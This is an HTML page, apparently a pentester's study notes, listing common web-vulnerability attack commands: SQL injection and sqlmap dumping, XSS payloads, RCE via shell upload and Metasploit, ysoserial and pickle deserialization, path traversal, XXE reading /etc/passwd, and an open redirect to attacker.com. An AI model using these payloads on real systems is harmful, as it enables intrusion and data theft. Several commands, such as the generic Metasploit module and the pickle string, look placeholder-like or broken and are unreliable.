@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Web Application Common Vulnerabilities</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Web Application Common Vulnerabilities | Vault-Tec Terminal</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Web Application Common Vulnerabilities" />
+<meta name="author" content="RedTeamer403" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="RedTeamer403 Security Portfolio" />
+<meta property="og:description" content="RedTeamer403 Security Portfolio" />
+<link rel="canonical" href="http://localhost:4000/notes/web/vulns/" />
+<meta property="og:url" content="http://localhost:4000/notes/web/vulns/" />
+<meta property="og:site_name" content="Vault-Tec Terminal" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Web Application Common Vulnerabilities" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"RedTeamer403"},"description":"RedTeamer403 Security Portfolio","headline":"Web Application Common Vulnerabilities","url":"http://localhost:4000/notes/web/vulns/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+  <div id="init-screen" class="init-screen">
+    <div class="init-content">
+      <div class="init-step">Initializing VAULT-TEC OS...</div>
+      <div class="init-step">Loading security protocols...</div>
+      <div class="init-step">Establishing secure connection...</div>
+      <div class="init-step">Connection established.</div>
+      <div class="init-step">SYSTEM READY</div>
+    </div>
+  </div>
+
+  <div id="main-content" class="main-content hidden">
+    <header>
+      <div class="container">
+        <h1>Vault-Tec Terminal</h1>
+        <nav>
+          <a href="/" >ABOUT</a>
+          <a href="/posts" >POSTS</a>
+          <a href="/notes" class="active">NOTES</a>
+          <a href="/tools" >TOOLS</a>
+        </nav>
+      </div>
+    </header>
+
+    <main class="container">
+      <div class="search-container">
+        <input type="text" class="search-input" placeholder="Search notes...">
+      </div>
+      <div class="notes-container">
+        <div class="notes-sidebar">
+          <div class="notes-category">
+            <h3>CheatSheets</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cheat/curl/" >CURL</a>
+              <a href="/notes/cheat/DNS/" >DNS</a>
+              <a href="/notes/cheat/file/" >File Transfer</a>
+              <a href="/notes/cheat/hydra/" >Hydra</a>
+              <a href="/notes/cheat/impacket/" >Impacket</a>
+              <a href="/notes/cheat/john/" >JohnTheRipper</a>
+              <a href="/notes/cheat/ncat/" >NCAT</a>
+              <a href="/notes/cheat/nmap/" >NMAP</a>
+              <a href="/notes/cheat/useful/" >Online Resources</a>
+              <a href="/notes/cheat/shell/" >Reverse Shell</a>
+              <a href="/notes/cheat/wordlists/" >Wordlists</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Active Directory</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/ad/enum/" >Domain Enumeration</a>
+              <a href="/notes/ad/attack/" >Attack Vectors</a>
+              <a href="/notes/ad/persist/" >Persistence</a>
+              <a href="/notes/ad/lateral/" >Lateral Movement</a>
+            </div>
+          </div>
+          
+          <div class="notes-category">
+            <h3>Cloud</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cloud/aws/" >AWS</a>
+              <a href="/notes/cloud/azure/" >Azure</a>
+              <a href="/notes/cloud/google/" >Google</a>
+              <a href="/notes/cloud/terra/" >Terraform</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Container</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/container/docker/" >Docker</a>
+              <a href="/notes/container/k8s/" >Kubernetes</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Linux</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/linux/checklist/" >Penetration Testing Checklist</a>
+              <a href="/notes/linux/enum/" >Enumeration</a>
+              <a href="/notes/linux/privesc/" >Privilege Escalation</a>
+              <a href="/notes/linux/post/" >Post Exploitation</a>
+              <a href="/notes/linux/services/" >Services</a>
+              <a href="/notes/linux/tools/" >Tools</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Network</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/network/exfil/" >Data Exfiltration</a>
+              <a href="/notes/network/scan/" >Port Scanning</a>
+              <a href="/notes/network/recon/" >Reconnaissance</a>
+              <a href="/notes/network/pivot/" >Pivoting</a>
+              <a href="/notes/network/services/" >Services</a>
+              <a href="/notes/network/sniff/" >Traffic Analysis</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Tech Stack</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/tech/cms/" >CMS</a>
+              <a href="/notes/tech/db/" >Databases</a>
+              <a href="/notes/tech/devops/" >DevOps</a>
+              <a href="/notes/tech/enterprise/" >Enterprise Apps</a>
+              <a href="/notes/tech/iam/" >IAM</a>
+              <a href="/notes/tech/mon/" >Monitoring</a>
+              <a href="/notes/tech/open/" >Open-Source</a>
+              <a href="/notes/tech/util/" >Utilities</a>
+              <a href="/notes/tech/server/" >Web Servers</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Windows</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/windows/av/" >AV/EDR Evasion</a>
+              <a href="/notes/windows/enum/" >Enumeration</a>
+              <a href="/notes/windows/privesc/" >Privilege Escalation</a>
+              <a href="/notes/windows/post/" >Post Exploitation</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Web Application</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/web/recon/" >Reconnaissance</a>
+              <a href="/notes/web/vulns/" class="active">Common Vulnerabilities</a>
+              <a href="/notes/web/auth/" >Authentication Bypass</a>
+              <a href="/notes/web/api/" >API Testing</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="notes-content">
+          <div id="search-results"></div>
+          <div id="note-content">
+            <h1 id="web-application-common-vulnerabilities">Web Application Common Vulnerabilities</h1>
+
+<h2 id="sql-injection">SQL Injection</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Test basic SQLi</span>
+curl <span class="s2">"http://example.com/login?user=admin' OR 1=1 -- &amp;pass="</span>
+
+<span class="c"># Use sqlmap</span>
+sqlmap <span class="nt">-u</span> http://example.com/login <span class="nt">--data</span><span class="o">=</span><span class="s2">"user=admin&amp;pass=test"</span> <span class="nt">--level</span><span class="o">=</span>3 <span class="nt">--risk</span><span class="o">=</span>3
+
+<span class="c"># Blind SQLi with time-based</span>
+sqlmap <span class="nt">-u</span> http://example.com/login <span class="nt">--technique</span><span class="o">=</span>T <span class="nt">--dbms</span><span class="o">=</span>mysql
+
+<span class="c"># Extract data</span>
+sqlmap <span class="nt">-u</span> http://example.com/login <span class="nt">--dump</span>
+
+<span class="c"># Union-based</span>
+curl <span class="s2">"http://example.com/search?q=' UNION SELECT 1,2,3 --"</span>
+</code></pre></div></div>
+
+<h2 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Reflected XSS test</span>
+&lt;script&gt;alert<span class="o">(</span><span class="s1">'XSS'</span><span class="o">)</span>&lt;/script&gt;
+
+<span class="c"># Stored XSS in form</span>
+&lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"&lt;script&gt;alert('XSS')&lt;/script&gt;"</span><span class="o">&gt;</span>
+
+<span class="c"># DOM-based XSS</span>
+window.location.href<span class="o">=</span><span class="s2">"javascript:alert('XSS')"</span>
+
+<span class="c"># Use XSS Hunter</span>
+xsshunter <span class="nt">-u</span> http://example.com
+
+<span class="c"># Automate with XSStrike</span>
+xsstrike <span class="nt">-u</span> http://example.com/search
+</code></pre></div></div>
+
+<h2 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Test CSRF with curl</span>
+curl <span class="nt">-X</span> POST http://example.com/action <span class="nt">-d</span> <span class="s2">"param=value"</span>
+
+<span class="c"># Generate CSRF PoC</span>
+csrfgen <span class="nt">-u</span> http://example.com <span class="nt">-o</span> csrf.html
+
+<span class="c"># Check token absence</span>
+curl <span class="nt">-I</span> http://example.com/action
+
+<span class="c"># Automate CSRF detection</span>
+arachni http://example.com <span class="nt">--report</span><span class="o">=</span>csrf
+</code></pre></div></div>
+
+<h2 id="remote-code-execution-rce">Remote Code Execution (RCE)</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Test basic RCE</span>
+curl <span class="s2">"http://example.com/cmd?input=whoami"</span>
+
+<span class="c"># Use Metasploit for RCE</span>
+msfconsole <span class="nt">-x</span> <span class="s2">"use exploit/multi/http/rce; set RHOSTS example.com; exploit"</span>
+
+<span class="c"># Upload and execute shell</span>
+curl <span class="nt">-F</span> <span class="s2">"file=@shell.php"</span> http://example.com/upload
+
+<span class="c"># Check for deserialization</span>
+ysoserial <span class="nt">-d</span> CommonsCollections1 <span class="nt">-o</span> payload.ser
+java <span class="nt">-jar</span> ysoserial.jar CommonsCollections1 <span class="s2">"touch /tmp/pwned"</span> <span class="o">&gt;</span> payload.ser
+</code></pre></div></div>
+
+<h2 id="other-vulnerabilities">Other Vulnerabilities</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Directory Traversal</span>
+curl <span class="s2">"http://example.com/download?file=../../etc/passwd"</span>
+
+<span class="c"># File Inclusion</span>
+curl <span class="s2">"http://example.com?page=php://filter/convert.base64-encode/resource=index.php"</span>
+
+<span class="c"># Insecure Deserialization</span>
+python <span class="nt">-c</span> <span class="s1">'import pickle; data=pickle.loads(b"cos\\nsystem\\n(S'</span><span class="nb">whoami</span><span class="s1">'\\ntR."); print(data)'</span>
+
+<span class="c"># XML External Entity (XXE)</span>
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;<span class="o">!</span>DOCTYPE root <span class="o">[</span>&lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"file:///etc/passwd"</span><span class="o">&gt;]&gt;</span>
+&lt;root&gt;&amp;xxe<span class="p">;</span>&lt;/root&gt;
+
+<span class="c"># Open Redirect</span>
+curl <span class="s2">"http://example.com/redirect?url=http://attacker.com"</span>
+</code></pre></div></div>
+
+<h2 id="tools">Tools</h2>
+<ul>
+  <li>sqlmap: <code class="language-bash highlighter-rouge">sqlmap <span class="nt">-u</span> http://example.com</code></li>
+  <li>XSStrike: <code class="language-bash highlighter-rouge">xsstrike <span class="nt">-u</span> http://example.com</code></li>
+  <li>Arachni: <code class="language-bash highlighter-rouge">arachni http://example.com</code></li>
+  <li>Nikto: <code class="language-bash highlighter-rouge">nikto <span class="nt">-h</span> http://example.com</code></li>
+  <li>OWASP ZAP: <code class="language-bash highlighter-rouge">zap-cli <span class="nt">-t</span> http://example.com</code></li>
+  <li>ysoserial: <code class="language-bash highlighter-rouge">ysoserial <span class="nt">-d</span> CommonsCollections1</code></li>
+  <li>wpscan: <code class="language-bash highlighter-rouge">wpscan <span class="nt">--url</span> http://example.com</code></li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <div class="system-info">
+      <div class="terminal-time"></div>
+      <div class="location-info"></div>
+    </div>
+  </div>
+
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
